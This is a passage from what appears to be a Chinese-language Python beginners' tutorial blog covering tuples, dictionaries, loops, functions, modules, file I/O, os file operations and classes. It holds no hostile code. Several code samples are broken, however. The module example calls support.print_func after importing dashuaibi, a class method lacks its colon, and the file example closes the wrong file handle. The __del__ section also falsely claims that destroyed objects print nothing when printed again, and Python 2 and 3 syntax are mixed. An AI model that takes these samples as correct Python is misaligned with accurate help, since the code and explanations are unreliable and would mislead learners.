<span class="built_in">tuple</span>               <span class="comment"># 输出完整元组</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">tuple</span>[<span class="number">0</span>]            <span class="comment"># 输出元组的第一个元素</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">tuple</span>[<span class="number">1</span>:<span class="number">3</span>]          <span class="comment"># 输出第二个至第四个（不包含）的元素 </span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">tuple</span>[<span class="number">2</span>:]           <span class="comment"># 输出从第三个开始至列表末尾的所有元素</span></span><br><span class="line"><span class="built_in">print</span> tinytuple * <span class="number">2</span>       <span class="comment"># 输出元组两次</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">tuple</span> + tinytuple   <span class="comment"># 打印组合的元组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> tup  <span class="comment"># 删除元组</span></span><br><span class="line">tup3 = tup1 + tup2        <span class="comment"># 元组不能修改,只能相加</span></span><br></pre></td></tr></table></figure><p><strong>元组内置函数</strong></p><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>cmp(tuple1, tuple2)</td><td>比较两个元组元素。</td></tr><tr><td>len(tuple)</td><td>计算元组元素个数。</td></tr><tr><td>max(tuple)</td><td>返回元组中元素最大值。</td></tr><tr><td>min(tuple)</td><td>返回元组中元素最小值。</td></tr><tr><td>tuple(seq)</td><td>将列表转换为元组。</td></tr></tbody></table><h2 id="Python-字典"><a href="#Python-字典" class="headerlink" title="Python 字典"></a>Python 字典</h2><p>字典(dictionary)是除列表以外python之中最灵活的内置数据结构类型。列表是有序的对象集合，字典是无序的对象集合。</p><p>两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。</p><p>字典用”{ }”标识。字典由索引(key)和它对应的值value组成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">dict</span> = &#123;&#125;</span><br><span class="line"><span class="built_in">dict</span>[<span class="string">&#x27;one&#x27;</span>] = <span class="string">&quot;This is one&quot;</span></span><br><span class="line"><span class="built_in">dict</span>[<span class="number">2</span>] = <span class="string">&quot;This is two&quot;</span></span><br><span class="line"> </span><br><span class="line">tinydict = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;shuaibi&#x27;</span>,<span class="string">&#x27;code&#x27;</span>:<span class="number">6734</span>, <span class="string">&#x27;dept&#x27;</span>: <span class="string">&#x27;sales&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">dict</span>[<span class="string">&#x27;one&#x27;</span>]          <span class="comment"># 输出键为&#x27;one&#x27; 的值</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">dict</span>[<span class="number">2</span>]              <span class="comment"># 输出键为 2 的值</span></span><br><span class="line"><span class="built_in">print</span> tinydict             <span class="comment"># 输出完整的字典</span></span><br><span class="line"><span class="built_in">print</span> tinydict.keys()      <span class="comment"># 输出所有键</span></span><br><span class="line"><span class="built_in">print</span> tinydict.values()    <span class="comment"># 输出所有值</span></span><br><span class="line"></span><br><span class="line">tinydict[<span class="string">&#x27;code&#x27;</span>] = <span class="number">6666</span> <span class="comment"># 更新</span></span><br><span class="line">tinydict[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;dashuaibi&quot;</span> <span class="comment"># 添加</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> tinydict[<span class="string">&#x27;name&#x27;</span>]  <span class="comment"># 删除键是&#x27;Name&#x27;的条目</span></span><br><span class="line">tinydict.clear()      <span class="comment"># 清空字典所有条目</span></span><br><span class="line"><span class="keyword">del</span> tinydict          <span class="comment"># 删除字典</span></span><br></pre></td></tr></table></figure><p><strong>字典内置函数&amp;方法</strong></p><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>cmp(dict1, dict2)</td><td>比较两个字典元素。</td></tr><tr><td>len(dict)</td><td>计算字典元素个数，即键的总数。</td></tr><tr><td>str(dict)</td><td>输出字典可打印的字符串表示。</td></tr><tr><td>type(variable)</td><td>返回输入的变量类型，如果变量是字典就返回字典类型。</td></tr></tbody></table><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>dict.clear()</td><td>删除字典内所有元素</td></tr><tr><td>dict.copy()</td><td>返回一个字典的浅复制</td></tr><tr><td>dict.fromkeys(seq[, val])</td><td>创建一个新字典，以序列 seq 中元素做字典的键，val 为字典所有键对应的初始值</td></tr><tr><td>dict.get(key, default=None)</td><td>返回指定键的值，如果值不在字典中返回default值</td></tr><tr><td>dict.has_key(key)</td><td>如果键在字典dict里返回true，否则返回false</td></tr><tr><td>dict.items()</td><td>以列表返回可遍历的(键, 值) 元组数组</td></tr><tr><td>dict.keys()</td><td>以列表返回一个字典所有的键</td></tr><tr><td>dict.setdefault(key, default=None)</td><td>和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</td></tr><tr><td>dict.update(dict2)</td><td>把字典dict2的键/值对更新到dict里</td></tr><tr><td>dict.values()</td><td>以列表返回字典中的所有值</td></tr><tr><td>pop(key[,default])</td><td>删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</td></tr><tr><td>popitem()</td><td>返回并删除字典中的最后一对键和值。</td></tr></tbody></table><p><strong>dict.items()</strong> 遍历字典的 键 值 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dict</span> = &#123;<span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;bbb&#x27;</span>, <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;ccc&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;字典值 : %s&quot;</span> %  <span class="built_in">dict</span>.items())</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 遍历字典列表</span></span><br><span class="line"><span class="keyword">for</span> key,values <span class="keyword">in</span>  <span class="built_in">dict</span>.items():</span><br><span class="line">    <span class="built_in">print</span> (key,values)</span><br></pre></td></tr></table></figure><h2 id="Python-条件语句"><a href="#Python-条件语句" class="headerlink" title="Python 条件语句"></a>Python 条件语句</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 判断条件：</span><br><span class="line">    执行语句……</span><br><span class="line"><span class="keyword">else</span>：</span><br><span class="line">    执行语句……</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> 判断条件<span class="number">1</span>:</span><br><span class="line">    执行语句<span class="number">1</span>……</span><br><span class="line"><span class="keyword">elif</span> 判断条件<span class="number">2</span>:</span><br><span class="line">    执行语句<span class="number">2</span>……</span><br><span class="line"><span class="keyword">elif</span> 判断条件<span class="number">3</span>:</span><br><span class="line">    执行语句<span class="number">3</span>……</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    执行语句<span class="number">4</span>……</span><br></pre></td></tr></table></figure><h2 id="Python-循环语句"><a href="#Python-循环语句" class="headerlink" title="Python 循环语句"></a>Python 循环语句</h2><p><strong>continue</strong> 语句跳出本次循环，而<strong>break</strong>跳出整个循环。</p><ul><li><strong>continue</strong>        用在while和for循环中,告诉Python跳过当前循环的剩余语句，然后继续进行下一轮循环</li><li><strong>break</strong>              break语句用来终止循环语句</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> 判断条件(condition)：</span><br><span class="line">    执行语句(statements)……</span><br></pre></td></tr></table></figure><p><strong>for循环</strong><br>遍历输出列表:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;10&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> url :      <span class="comment">#冒号!!!</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>同时对应输出多个列表:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url1 = [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;10&#x27;</span>]</span><br><span class="line">url2 = [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;10&#x27;</span>]</span><br><span class="line">url3 = [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;10&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x,y,z <span class="keyword">in</span> <span class="built_in">zip</span>(url1,url2,url3):</span><br><span class="line">    <span class="built_in">print</span>(x+y+z)</span><br></pre></td></tr></table></figure><h2 id="Python-函数"><a href="#Python-函数" class="headerlink" title="Python 函数"></a>Python 函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span>(<span class="params">name</span>):</span>                <span class="comment">#def 声明一个函数</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="keyword">return</span>                      <span class="comment">#return选择性地返回一个值给调用方,不带return相当于返回 None。</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;dashuaibi&quot;</span></span><br><span class="line">admin(name)       </span><br></pre></td></tr></table></figure><h2 id="Python-时间日期"><a href="#Python-时间日期" class="headerlink" title="Python 时间日期"></a>Python 时间日期</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time<span class="comment">#导入时间模块</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(time.localtime(time.time()))         <span class="comment">#打印本地时间元组</span></span><br><span class="line"></span><br><span class="line">localtime = time.asctime( time.localtime(time.time()) )<span class="comment">#用time的asctime方法格式化本地时间元组</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化成2016-03-20 11:45:39形式</span></span><br><span class="line"><span class="built_in">print</span> time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, time.localtime()) </span><br></pre></td></tr></table></figure><h2 id="Python-模块"><a href="#Python-模块" class="headerlink" title="Python 模块"></a>Python 模块</h2><p>Python 模块(Module)，是一个 Python 文件，以 .py 结尾，包含了 Python 对象定义和Python语句。相当于php中的 include()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dashuaibi.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_func</span>(<span class="params"> par </span>):</span></span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Hello : &quot;</span>, par</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="keyword">import</span> dashuaibi <span class="comment">#载入 dashuaibi 模块,默认只会被执行一次</span></span><br><span class="line">reload(dashuaibi)     <span class="comment">#重载 dashuaibi 模块</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 现在可以调用模块里包含的函数了</span></span><br><span class="line">support.print_func(<span class="string">&quot;dashuaibi&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p> <strong>from…import 语句</strong></p><p>Python 的 from 语句让你从模块中导入一个指定的部分到当前命名空间中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fbi <span class="keyword">import</span> fbidasuaibi<span class="comment">#导入fbi 模块的fbidasuaibi函数</span></span><br><span class="line"><span class="keyword">from</span> fbi <span class="keyword">import</span> *              <span class="comment">#导入fbi 模块的所有函数</span></span><br></pre></td></tr></table></figure><p><strong>dir()</strong> </p><p>dir() 函数一个排好序的字符串列表，内容是一个模块里定义过的名字。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math    <span class="comment">#导入math 模块</span></span><br><span class="line">content = <span class="built_in">dir</span>(math)<span class="comment">#dir()函数列出被导入模块中所有的函数名</span></span><br><span class="line"><span class="built_in">print</span> (content)</span><br></pre></td></tr></table></figure><p><strong>Python中的包</strong></p><p>包就是文件夹，但该文件夹下必须存在 <code>__init__.py</code> 文件, 该文件的内容可以为空。**__<code>init__.py</code>** 用于标识当前文件夹是一个包。</p><p>新建文件夹(包) 并新建空文件名为 <code>__init__.py</code>标识为python包,里面就可以放写好的python文件模块了.</p><p>引用时:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 导入 bao 包</span></span><br><span class="line"><span class="keyword">from</span> bao.shuaibi1 <span class="keyword">import</span> fbi1</span><br><span class="line"><span class="keyword">from</span> bao.shuaibi2 <span class="keyword">import</span> fbi2</span><br><span class="line"> </span><br><span class="line">fbi1()</span><br><span class="line">fbi2()</span><br></pre></td></tr></table></figure><h2 id="Python-文件I-O"><a href="#Python-文件I-O" class="headerlink" title="Python 文件I/O"></a>Python 文件I/O</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bb = <span class="built_in">open</span>(<span class="string">&quot;bb.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;文件名: &quot;</span>, bb.name)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;文件开关 : &quot;</span>, bb.closed)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;访问模式 : &quot;</span>, bb.mode)</span><br><span class="line">readcontents = bb.read()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;文件内容 : &quot;</span>,readcontents)</span><br><span class="line">bb.close()</span><br><span class="line"></span><br><span class="line">cc= <span class="built_in">open</span>(<span class="string">&quot;ww.txt&quot;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">contents = <span class="string">&quot;写入内容\n&quot;</span></span><br><span class="line">cc.flush() <span class="comment">#刷新文件内部缓冲,直接把内部缓冲区的数据立刻写入文件</span></span><br><span class="line">write = cc.write(contents)</span><br><span class="line">bb.close()</span><br></pre></td></tr></table></figure><p><strong>os模块</strong></p><p>使用os模块需要提前导入, import os</p><ul><li>rename() 方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.rename( <span class="string">&quot;test1.txt&quot;</span>, <span class="string">&quot;test2.txt&quot;</span> )<span class="comment"># test1.txt 改名为 test2.txt</span></span><br></pre></td></tr></table></figure><ul><li>remove()方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.remove(<span class="string">&quot;test2.txt&quot;</span>)<span class="comment">#删除已经存在的文件</span></span><br></pre></td></tr></table></figure><ul><li>mkdir()方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.mkdir(<span class="string">&quot;test&quot;</span>)<span class="comment"># 创建目录</span></span><br></pre></td></tr></table></figure><ul><li>chdir()方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.chdir(<span class="string">&quot;/home/newdir&quot;</span>)<span class="comment"># 当前的目录改为</span></span><br></pre></td></tr></table></figure><ul><li>getcwd()方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> os.getcwd()<span class="comment"># 给出当前的目录</span></span><br></pre></td></tr></table></figure><ul><li>rmdir()方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.rmdir(<span class="string">&#x27;dirname&#x27;</span>)<span class="comment">#删目录</span></span><br></pre></td></tr></table></figure><ul><li>listdir()方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.listdir(<span class="string">&#x27;dirname&#x27;</span>)<span class="comment">#列目录</span></span><br></pre></td></tr></table></figure><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><p><strong>创建类</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span>:</span></span><br><span class="line">   <span class="string">&#x27;类的帮助信息&#x27;</span>   <span class="comment">#类文档字符串</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">aa</span>):</span>  <span class="comment">#类体</span></span><br><span class="line">        name = name</span><br><span class="line">        </span><br><span class="line"></span><br></pre></td></tr></table></figure><p> <strong>self代表类的实例</strong></p><p>因为还没有实例化,声明self才能调用类中的属性和方法,类的方法参数必须写self</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>:</span></span><br><span class="line">    a = <span class="number">10</span>         <span class="comment">#类属性</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prt</span>(<span class="params">self</span>):</span> <span class="comment">#必须写self</span></span><br><span class="line">        <span class="built_in">print</span>(self.a)       <span class="comment">#self 代表的是类的实例,代表当前对象的地址</span></span><br><span class="line">        <span class="built_in">print</span>(self.__class__)   <span class="comment">#self.__class__ 则指向类</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pp</span>(<span class="params">self,a</span>) #必须写<span class="title">self</span></span></span><br><span class="line"><span class="function">    <span class="title">self</span>.<span class="title">prt</span>() #类中调用类中的方法</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">t</span> = <span class="title">Test</span>()          </span></span><br><span class="line"><span class="function"><span class="title">print</span>(<span class="params">t.a</span>) #访问类属性</span></span><br><span class="line"><span class="function"><span class="title">t</span>.<span class="title">pp</span>()</span></span><br></pre></td></tr></table></figure><p><strong>类的增删改查</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span>:</span></span><br><span class="line">   <span class="string">&#x27;所有员工的基类&#x27;</span></span><br><span class="line">   empCount = <span class="number">0</span>   <span class="comment">#empCount变量是一个类变量,它这个类的所有实例之间共享</span></span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, salary</span>):</span>   <span class="comment">#__init__()方法为类的初始方法,默认先执行它,类似于魔术方法</span></span><br><span class="line">      self.name = name   <span class="comment">#self 代表类的实例,定义类的方法时必须有</span></span><br><span class="line">      self.salary = salary</span><br><span class="line">      Employee.empCount += <span class="number">1</span></span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">displayCount</span>(<span class="params">self</span>):</span></span><br><span class="line">     <span class="built_in">print</span> (<span class="string">&quot;Total Employee %d&quot;</span> % Employee.empCount)</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">displayEmployee</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="built_in">print</span> (<span class="string">&quot;Name : &quot;</span>, self.name,  <span class="string">&quot;, Salary: &quot;</span>, self.salary)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">emp1 = Employee(<span class="string">&quot;Zara&quot;</span>, <span class="number">2000</span>)    <span class="comment">#&quot;创建 Employee 类的第一个对象&quot;</span></span><br><span class="line">emp2 = Employee(<span class="string">&quot;Manni&quot;</span>, <span class="number">6000</span>)   <span class="comment">#&quot;创建 Employee 类的第二个对象&quot;</span></span><br><span class="line">emp1.displayEmployee()           <span class="comment"># 访问属性</span></span><br><span class="line">emp2.displayEmployee()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Total Employee %d&quot;</span> % Employee.empCount)</span><br><span class="line"></span><br><span class="line">emp1.age1 = <span class="number">7</span>   <span class="comment"># 添加一个 &#x27;age&#x27; 属性</span></span><br><span class="line"><span class="comment"># emp1.age = 8  # 修改 &#x27;age&#x27; 属性</span></span><br><span class="line"><span class="comment"># del emp1.age1  # 删除 &#x27;age&#x27; 属性</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;age %d&quot;</span> % emp1.age1)</span><br></pre></td></tr></table></figure><p><strong>Python内置类属性</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&quot;Employee.__doc__:&quot;</span>, Employee.__doc__   <span class="comment">#文档名称</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Employee.__name__:&quot;</span>, Employee.__name__ <span class="comment">#类的名称</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Employee.__module__:&quot;</span>, Employee.__module__<span class="comment">#类定义所在的模块</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Employee.__bases__:&quot;</span>, Employee.__bases__<span class="comment">#类的所有父类构成元素（包含了一个由所有父类组成的元组）</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Employee.__dict__:&quot;</span>, Employee.__dict__ <span class="comment">#类的属性（包含一个字典，由类的数据属性组成）暂时理解为实例的序列化.</span></span><br></pre></td></tr></table></figure><p><strong>python对象销毁</strong></p><p>和<code>__init__</code>类的初始化方法相反,析构函数 <code>__del__</code> ，<code>__del__</code>在对象销毁的时候被调用，当对象不再被使用时，<code>__del__</code>方法运行.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CLanguage</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;调用父类 __del__() 方法&quot;</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cl</span>(<span class="params">CLanguage</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;调用子类 __del__() 方法&quot;</span>)</span><br><span class="line">        </span><br><span class="line">a = CLanguage()</span><br><span class="line">c = cl()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)            <span class="comment">#调用时继续执行里面的代码,调用结束时,自动销毁释放内存</span></span><br><span class="line"><span class="built_in">print</span>(c)<span class="comment">#调用时继续执行里面的代码,调用结束时,自动销毁释放内存</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)            <span class="comment">#再次调用则不会有任何输出,因为已经销毁,释放内存.</span></span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><p><strong>类的继承</strong></p><p>继承语法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 子类(<span class="params">父类名</span>)</span></span><br><span class="line"><span class="class">    ...    </span></span><br></pre></td></tr></table></figure><p>继承多个类:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span>        <span class="comment"># 定义类 A</span></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span>         <span class="comment"># 定义类 B</span></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>(<span class="params">A, B</span>):</span>   <span class="comment"># 继承类 A 和 B</span></span><br><span class="line">.....    